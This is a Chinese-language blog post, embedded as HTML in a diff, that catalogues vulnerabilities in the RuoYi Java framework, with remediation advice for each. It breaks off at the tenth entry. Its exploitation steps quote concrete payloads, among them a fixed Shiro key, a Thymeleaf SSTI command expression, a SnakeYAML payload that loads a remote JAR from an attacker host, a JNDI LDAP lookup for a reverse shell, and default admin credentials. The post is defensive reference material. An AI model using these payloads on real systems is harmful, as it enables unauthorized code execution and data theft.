@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>若依（RuoYi）单体版框架安全漏洞全面汇总 - Eccentric&#39;s Note</title><meta name="Description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。"><meta property="og:url" content="https://188.hubu.eu.cc/posts/%E8%8B%A5%E4%BE%9Druoyi%E5%8D%95%E4%BD%93%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/">
+  <meta property="og:site_name" content="Eccentric&#39;s Note">
+  <meta property="og:title" content="若依（RuoYi）单体版框架安全漏洞全面汇总">
+  <meta property="og:description" content="覆盖 v4.5.x ~ v4.8.2&#43; 全版本线 | 17 个漏洞 | 7 个 CVE 编号 | 整理时间：2026年5月">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-01T08:59:26+08:00">
+    <meta property="article:modified_time" content="2026-05-01T08:59:26+08:00">
+    <meta property="article:tag" content="Ruoyi">
+    <meta property="article:tag" content="漏洞">
+    <meta property="og:image" content="https://188.hubu.eu.cc/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://188.hubu.eu.cc/logo.png">
+  <meta name="twitter:title" content="若依（RuoYi）单体版框架安全漏洞全面汇总">
+  <meta name="twitter:description" content="覆盖 v4.5.x ~ v4.8.2&#43; 全版本线 | 17 个漏洞 | 7 个 CVE 编号 | 整理时间：2026年5月">
+<meta name="application-name" content="Eccentric&#39;s Note">
+<meta name="apple-mobile-web-app-title" content="Eccentric&#39;s Note"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/header_images/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://188.hubu.eu.cc/posts/%E8%8B%A5%E4%BE%9Druoyi%E5%8D%95%E4%BD%93%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/" /><link rel="prev" href="https://188.hubu.eu.cc/posts/uni-app-x%E7%A6%BB%E7%BA%BF%E6%89%93%E5%8C%85%E6%B5%81%E7%A8%8B/" /><link rel="next" href="https://188.hubu.eu.cc/posts/hugo%E7%BB%98%E5%88%B6echarts%E5%9B%BE%E8%A1%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "若依（RuoYi）单体版框架安全漏洞全面汇总",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/188.hubu.eu.cc\/posts\/%E8%8B%A5%E4%BE%9Druoyi%E5%8D%95%E4%BD%93%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB\/"
+        },"genre": "posts","keywords": "ruoyi, 漏洞","wordcount":  5295 ,
+        "url": "https:\/\/188.hubu.eu.cc\/posts\/%E8%8B%A5%E4%BE%9Druoyi%E5%8D%95%E4%BD%93%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB\/","datePublished": "2026-05-01T08:59:26+08:00","dateModified": "2026-05-01T08:59:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Better"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 首页 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/posts/"> 归档 </a><a class="menu-item" href="/pdflist/"><i class='fa-solid fa-book'></i> pdf </a><a class="menu-item" href="/friend/" title="友链"><i class='fa-solid fa-link'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">首页</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/posts/" title="">归档</a><a class="menu-item" href="/pdflist/" title=""><i class='fa-solid fa-book'></i>pdf</a><a class="menu-item" href="/friend/" title="友链"><i class='fa-solid fa-link'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">若依（RuoYi）单体版框架安全漏洞全面汇总</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Better</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/java%E5%90%8E%E7%AB%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java后端</a>&nbsp;<a href="/categories/ruoyi/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ruoyi</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-05-01">2026-05-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 5295 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 11 分钟&nbsp;<span id="/posts/%E8%8B%A5%E4%BE%9Druoyi%E5%8D%95%E4%BD%93%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/" class="leancloud_visitors" data-flag-title="若依（RuoYi）单体版框架安全漏洞全面汇总">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-apache-shiro-默认密钥反序列化-rce">1. Apache Shiro 默认密钥反序列化 RCE</a></li>
+    <li><a href="#2-thymeleaf-ssti-模板注入可获取-shiro-密钥rce">2. Thymeleaf SSTI 模板注入（可获取 Shiro 密钥+RCE）</a></li>
+    <li><a href="#3-定时任务-snakeyaml-反序列化-rce">3. 定时任务 SnakeYAML 反序列化 RCE</a></li>
+    <li><a href="#4-定时任务-jndi-注入-rce">4. 定时任务 JNDI 注入 RCE</a></li>
+    <li><a href="#5-定时任务-sql-注入绕过白名单致-rce">5. 定时任务 SQL 注入绕过白名单致 RCE</a></li>
+    <li><a href="#6-quartz-定时任务代码注入-rce">6. Quartz 定时任务代码注入 RCE</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#7-认证用户-sql-注入createtable-接口">7. 认证用户 SQL 注入（createTable 接口）</a></li>
+    <li><a href="#8-sql-注入黑名单绕过">8. SQL 注入黑名单绕过</a></li>
+    <li><a href="#9-后台分页参数-sql-注入orderbycolumn">9. 后台分页参数 SQL 注入（orderByColumn）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#10-任意文件下载漏洞">10. 任意文件下载漏洞</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#11-权限提升漏洞joblogid-参数">11. 权限提升漏洞（jobLogId 参数）</a></li>
+    <li><a href="#12-白名单-getbeanname-函数绕过">12. 白名单 getBeanName 函数绕过</a></li>
+    <li><a href="#13-权限提升漏洞">13. 权限提升漏洞</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#14-默认弱口令-adminadmin123">14. 默认弱口令 admin/admin123</a></li>
+    <li><a href="#15-druid-监控页面未授权访问">15. Druid 监控页面未授权访问</a></li>
+    <li><a href="#16-swagger-接口文档未授权访问">16. Swagger 接口文档未授权访问</a></li>
+    <li><a href="#17-多个安全漏洞v480-集中披露">17. 多个安全漏洞（v4.8.0 集中披露）</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>覆盖 v4.5.x ~ v4.8.2+ 全版本线  |  17 个漏洞  |  7 个 CVE 编号 | 整理时间：2026年5月</p>
+<h1 id="前言">前言</h1>
+<p>若依（RuoYi）是国内使用最广泛的开源 Java 快速开发平台之一，基于 Spring Boot + MyBatis 构建，GitHub/Gitee 星标数万。正因其广泛使用，若依框架也成为了攻防演练和渗透测试中的高频目标。本文系统梳理若依单体版（非微服务版本）从 v4.5.x 到最新 v4.8.2+ 的全部已知安全漏洞，涵盖反序列化 RCE、模板注入、SQL 注入、任意文件下载、权限提升、未授权访问等多个维度，供安全研究人员和开发者参考。</p>
+<p>声明：本文仅用于安全研究和防御加固参考，请勿将相关信息用于非法用途。所有漏洞信息均来自公开渠道。</p>
+<h1 id="漏洞总览速查表">漏洞总览速查表</h1>
+<table>
+  <thead>
+      <tr>
+          <th>序号</th>
+          <th>漏洞名称</th>
+          <th>CVE 编号</th>
+          <th>影响版本</th>
+          <th>类型</th>
+          <th>危害等级</th>
+          <th>状态</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>Apache Shiro 默认密钥反序列化 RCE</td>
+          <td>CVE-2016-4437（关联）</td>
+          <td>&lt; v4.6.2</td>
+          <td>反序列化/RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Thymeleaf SSTI 模板注入（可获取 Shiro 密钥+RCE）</td>
+          <td>无公开 CVE</td>
+          <td>&lt;= v4.8.1</td>
+          <td>SSTI/RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>定时任务 SnakeYAML 反序列化 RCE</td>
+          <td>无公开 CVE</td>
+          <td>&lt; v4.7.6</td>
+          <td>反序列化/RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>定时任务 JNDI 注入 RCE</td>
+          <td>无公开 CVE</td>
+          <td>&lt; v4.7.6</td>
+          <td>JNDI注入/RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>定时任务 SQL 注入绕过白名单致 RCE</td>
+          <td>无公开 CVE</td>
+          <td>v4.7.8 及附近版本</td>
+          <td>SQL注入+RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Quartz 定时任务代码注入 RCE</td>
+          <td>CVE-2026-4564</td>
+          <td>&lt;= v4.8.2</td>
+          <td>代码注入/RCE</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>认证用户 SQL 注入（createTable 接口）</td>
+          <td>CVE-2024-57521</td>
+          <td>&lt;= v4.7.9</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>SQL 注入黑名单绕过</td>
+          <td>CVE-2024-42913</td>
+          <td>&lt;= v4.7.9</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>后台分页参数 SQL 注入（orderByColumn）</td>
+          <td>无统一 CVE</td>
+          <td>多版本（含 v4.8.1）</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>10</td>
+          <td>任意文件下载漏洞</td>
+          <td>CVE-2023-27025</td>
+          <td>&lt;= v4.7.6</td>
+          <td>路径穿越/文件下载</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>11</td>
+          <td>权限提升漏洞（jobLogId 参数）</td>
+          <td>CVE-2025-28406</td>
+          <td>v4.8.0</td>
+          <td>权限提升</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>12</td>
+          <td>白名单 getBeanName 函数绕过</td>
+          <td>CVE-2025-0734</td>
+          <td>v4.8.0</td>
+          <td>安全绕过</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>13</td>
+          <td>权限提升漏洞</td>
+          <td>CVE-2025-56396</td>
+          <td>&lt;= v4.8.1</td>
+          <td>权限提升</td>
+          <td>严重</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>14</td>
+          <td>默认弱口令 admin/admin123</td>
+          <td>无</td>
+          <td>所有版本</td>
+          <td>默认凭据</td>
+          <td>高危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>15</td>
+          <td>Druid 监控页面未授权访问</td>
+          <td>无</td>
+          <td>多版本（配置相关）</td>
+          <td>未授权访问/信息泄露</td>
+          <td>中危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>16</td>
+          <td>Swagger 接口文档未授权访问</td>
+          <td>无</td>
+          <td>多版本（配置相关）</td>
+          <td>未授权访问/信息泄露</td>
+          <td>中危</td>
+          <td>已公开</td>
+      </tr>
+      <tr>
+          <td>17</td>
+          <td>多个安全漏洞（v4.8.0 集中披露）</td>
+          <td>CVE-2024-57436 ~ 57439</td>
+          <td>v4.8.0</td>
+          <td>信息泄露/安全缺陷</td>
+          <td>中危</td>
+          <td>已公开</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="1-远程代码执行rce漏洞-严重-">1. 远程代码执行（RCE）漏洞[ 严重 ]</h1>
+<h2 id="1-apache-shiro-默认密钥反序列化-rce">1. Apache Shiro 默认密钥反序列化 RCE</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2016-4437（关联）</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt; v4.6.2</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>反序列化/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依早期版本使用固定 Shiro 加密密钥 fCq+/xW488hMTCD+cmJ3aQ==（AES-CBC），攻击者可利用已知密钥构造恶意 RememberMe Cookie，触发 Java 反序列化攻击，实现未授权远程代码执行。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>识别目标使用若依且版本 &lt; 4.6.2（响应头含 rememberMe=deleteMe）</p>
+</li>
+<li>
+<p>使用已知 Shiro 密钥加密恶意序列化对象</p>
+</li>
+<li>
+<p>将 payload 设置到 Cookie 的 rememberMe 字段</p>
+</li>
+<li>
+<p>服务端解密反序列化触发 RCE，可使用 ShiroExploit 等工具一键利用</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级到 RuoYi &gt;= 4.6.2（使用随机密钥）；检查 ShiroConfig.java 中是否仍包含固定密钥；升级 Shiro 组件至最新版本。</p>
+<h2 id="2-thymeleaf-ssti-模板注入可获取-shiro-密钥rce">2. Thymeleaf SSTI 模板注入（可获取 Shiro 密钥+RCE）</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无公开 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.8.1</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SSTI/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依使用 Thymeleaf 作为模板引擎，/monitor/cache/getNames 等接口中存在可控 fragment 参数，且未加 @ResponseBody 注解，Thymeleaf 引擎会解析传入的模板表达式（SpEL），可执行任意代码。典型利用是先通过 SSTI 读取 Shiro 密钥，再链接 Shiro 反序列化实现完整 RCE。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>访问存在漏洞的缓存监控相关接口</p>
+</li>
+<li>
+<p>在 fragment 参数中注入 Thymeleaf 表达式，如 <strong>${T(java.lang.Runtime).getRuntime().exec(&lsquo;whoami&rsquo;)}</strong>::.x</p>
+</li>
+<li>
+<p>服务端解析表达式执行任意命令</p>
+</li>
+<li>
+<p>高版本 JDK16+ 环境需使用特殊绕过技巧</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级到官方修复版本；对 controller 方法添加 @ResponseBody 注解防止模板解析；对输入进行严格过滤。</p>
+<h2 id="3-定时任务-snakeyaml-反序列化-rce">3. 定时任务 SnakeYAML 反序列化 RCE</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无公开 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt; v4.7.6</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>反序列化/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依定时任务模块允许通过 invokeTarget 指定类的全路径进行调用。攻击者可构造 SnakeYAML 反序列化 payload 作为调用目标，触发远程代码执行。低版本无任何校验可直接利用，中间版本可通过空格和单引号绕过黑名单。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>登录后台 → 定时任务管理</p>
+</li>
+<li>
+<p>创建新任务，invokeTarget 填入 org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&ldquo;http://attacker/evil.jar&rdquo;]]]]&rsquo;)</p>
+</li>
+<li>
+<p>执行任务触发反序列化，加载远程恶意 JAR 实现 RCE</p>
+</li>
+<li>
+<p>高版本可通过 SQL 注入间接修改 sys_job 表绕过前端校验</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级 SnakeYAML 到安全版本；对 invokeTarget 实施严格白名单校验；禁止调用危险类和方法；移除类全路径实例化执行逻辑。</p>
+<h2 id="4-定时任务-jndi-注入-rce">4. 定时任务 JNDI 注入 RCE</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无公开 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt; v4.7.6</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>JNDI注入/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>利用定时任务类路径实例化功能，构造 javax.naming.InitialContext.lookup(&rsquo;ldap://attacker&rsquo;) 类型的 JNDI 调用，指向攻击者控制的 LDAP/RMI 服务，加载并执行远程恶意类。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>编译恶意 Exploit 类并托管于 HTTP 服务</p>
+</li>
+<li>
+<p>使用 marshalsec 启动 LDAP 引用服务</p>
+</li>
+<li>
+<p>修改定时任务调用目标为 JNDI lookup 载荷</p>
+</li>
+<li>
+<p>触发执行后获取反弹 Shell</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>禁用类路径调用方式；升级 JDK 至高版本（&gt;= 8u191，默认禁止远程 Reference 工厂类加载）；升级到若依修复版本。</p>
+<h2 id="5-定时任务-sql-注入绕过白名单致-rce">5. 定时任务 SQL 注入绕过白名单致 RCE</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无公开 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>v4.7.8 及附近版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入+RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>v4.7.7 后若依对定时任务可调用类实施了黑白名单限制，但 genTableServiceImpl 的 mapper 直接执行 ${sql} 表达式。攻击者通过定时任务调用 genTableServiceImpl.createTable() 执行 UPDATE 语句修改 sys_job 表中的 invoke_target 字段，用十六进制编码绕过黑白名单限制实现 RCE。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>创建定时任务，调用目标设为 genTableServiceImpl.createTable(&lsquo;UPDATE sys_job SET invoke_target=0x[hex_payload] WHERE &hellip;&rsquo;)</p>
+</li>
+<li>
+<p>恶意载荷用十六进制编码绕过过滤</p>
+</li>
+<li>
+<p>执行完 UPDATE 后，再执行被修改的任务即触发 RCE</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>对 genTableServiceImpl.createTable 进行严格 SQL 白名单校验（仅允许 CREATE TABLE）；禁止 mapper 中 ${sql} 直接拼接。</p>
+<h2 id="6-quartz-定时任务代码注入-rce">6. Quartz 定时任务代码注入 RCE</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2026-4564</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.8.2</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>代码注入/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>RuoYi 4.8.2 及以下版本 Quartz Job 定时任务模块 /monitor/job/ 中，远程攻击者在获取后台管理权限后，可通过构造恶意 invokeTarget 字符串利用 Java 反射机制执行任意代码。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>获取后台管理权限</p>
+</li>
+<li>
+<p>在定时任务管理中构造恶意 invokeTarget 字符串</p>
+</li>
+<li>
+<p>利用 Java 反射机制绕过安全限制执行任意代码</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级到官方最新修复版本；对 invokeTarget 参数实施更严格的安全校验。</p>
+<h1 id="2-sql-注入漏洞---高危-">2. SQL 注入漏洞  [ 高危 ]</h1>
+<h2 id="7-认证用户-sql-注入createtable-接口">7. 认证用户 SQL 注入（createTable 接口）</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2024-57521</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.9</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>漏洞位于代码生成功能的 /tool/gen/createTable 接口，接收用户传入的 sql 参数并通过 SqlUtil.filterKeyword(sql) 过滤。但正则表达式未能有效拦截特定字符，攻击者可绕过过滤执行任意 SQL。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>已登录用户向 /tool/gen/createTable 提交构造的 sql 参数</p>
+</li>
+<li>
+<p>借助 CREATE TABLE &hellip; AS SELECT &hellip; 语法结合条件报错逻辑</p>
+</li>
+<li>
+<p>使用 IF(&hellip;, 1, 1/0) 对数据库信息逐字符枚举</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级至最新版本；对 createTable 接口的 SQL 输入使用参数化处理；加强正则过滤规则，用白名单替代黑名单。</p>
+<h2 id="8-sql-注入黑名单绕过">8. SQL 注入黑名单绕过</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2024-42913</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.9</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依对 SQL 注入实施了关键字黑名单防护，但攻击者可通过特殊编码或语法变换绕过黑名单检测，实现 SQL 注入攻击。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>分析若依 SQL 关键字黑名单过滤逻辑</p>
+</li>
+<li>
+<p>使用特殊编码、大小写混合、注释符等方式绕过</p>
+</li>
+<li>
+<p>通过绕过后的 SQL 注入语句获取数据库信息</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>采用参数化查询替代黑名单过滤；升级到修复版本；使用 WAF 进行深层 SQL 注入防护。</p>
+<h2 id="9-后台分页参数-sql-注入orderbycolumn">9. 后台分页参数 SQL 注入（orderByColumn）</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无统一 CVE</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多版本（含 v4.8.1）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>SQL注入</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依使用 MyBatis 进行数据库操作，部分接口（如 /system/user/list）的分页排序参数 orderByColumn 使用 ${} 进行动态 SQL 拼接而非参数化查询 #{}，导致 SQL 注入。v4.8.1 中仍可通过三级嵌套 CASE WHEN 绕过正则白名单。</p>
+<p>利用方式</p>
+<p>在后台功能请求中修改 orderByColumn 参数，注入恶意 SQL 表达式，通过时间盲注或联合查询实现数据窃取。</p>
+<p>修复建议</p>
+<p>将所有 ${} 动态拼接改为 #{} 参数化查询；对排序字段进行严格白名单校验。</p>
+<h1 id="3-文件操作漏洞---高危-">3. 文件操作漏洞  [ 高危 ]</h1>
+<h2 id="10-任意文件下载漏洞">10. 任意文件下载漏洞</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
